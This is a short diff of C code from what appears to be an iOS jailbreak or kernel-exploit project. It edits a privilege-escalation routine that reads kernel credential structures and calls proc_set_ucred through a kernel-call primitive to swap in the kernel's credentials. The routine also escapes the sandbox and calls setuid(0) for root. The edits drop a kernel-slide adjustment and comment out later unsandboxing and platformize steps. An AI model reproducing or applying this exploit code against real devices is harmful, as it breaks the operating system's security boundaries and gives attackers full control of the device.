@@ -105,6 +105,8 @@ uint64_t mineek_kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint
     return returnval;
 }
 
+
+
 void mineek_getRoot(uint64_t proc_addr)
 {
     self_ro = kread64(proc_addr + 0x20);
@@ -119,18 +121,13 @@ void mineek_getRoot(uint64_t proc_addr)
     printf("[i] kern_ro: 0x%llx\n", kern_ro);
     uint64_t kern_ucred = kread64(kern_ro + 0x20);
     printf("[i] kern_ucred: 0x%llx\n", kern_ucred);
-
-    // use proc_set_ucred to set kernel proc.
-    uint64_t proc_set_ucred = off_proc_set_ucred;
-    proc_set_ucred += get_kslide();
-    printf("[i] func: 0x%llx\n", proc_set_ucred);
     
     cr_label = kread64(self_ucred + off_u_cr_label); // MAC label
     orig_sb = kread64(cr_label + off_sandbox_slot);// not working
 
     sb = unsandbox(getpid());
     
-    kcall(proc_set_ucred, proc_addr, kern_ucred, 0, 0, 0, 0, 0);
+    kcall(off_proc_set_ucred, proc_addr, kern_ucred, 0, 0, 0, 0, 0);
     setuid(0);
     setuid(0);
     printf("[i] getuid: %d\n", getuid());
@@ -187,10 +184,10 @@ void stage2_all(void) {
     usleep(10000);
     ucred_test(proc_addr);
     usleep(10000);
+    
     // todo: get kernel
     // kreadbuf(0xFFFFFFF007004000 + get_kslide(), rawkern, ksize);
     // todo: output
     // todo: kpf(rawkern)
-    unsandbox_stage2();
-    platformize(pid);
+    //unsandbox_stage2();
 }
